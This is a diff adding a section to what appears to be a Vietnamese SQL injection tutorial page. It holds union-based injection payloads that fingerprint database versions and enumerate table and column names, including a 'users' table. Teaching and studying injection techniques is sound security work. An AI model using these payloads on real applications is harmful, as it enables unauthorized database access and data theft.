@@ -80,3 +80,11 @@ WHERE category = 'Gifts' or 1=1;--' AND released = 1;</pre>
 <p><strong>Microsoft, MySQL</strong>: <code>' union select @@version</code></p>
 <p><strong>Oracle</strong>: <code>' union select v$version</code></p>
 <p><strong>PostgreSQL</strong>: <code>' union select version()</code></p>
+
+<h3>2.3. Xác định tên bảng và cột</h3>
+<p>Lưu ý mỗi database có 1 syntax nên payload sẽ thay đổi 1 xíu dựa trên loại database</p>
+<p><strong>Non-Oracle:</strong></p>
+<p><strong>Payload tên bảng</strong>:</p>
+<pre>' union select null, table_name from information_schema.tables--</pre>
+<p><strong>Payload tên cột</strong>:</p>
+<pre>' union select null, column_name from information_schema.columns where table_name='users'--</pre>
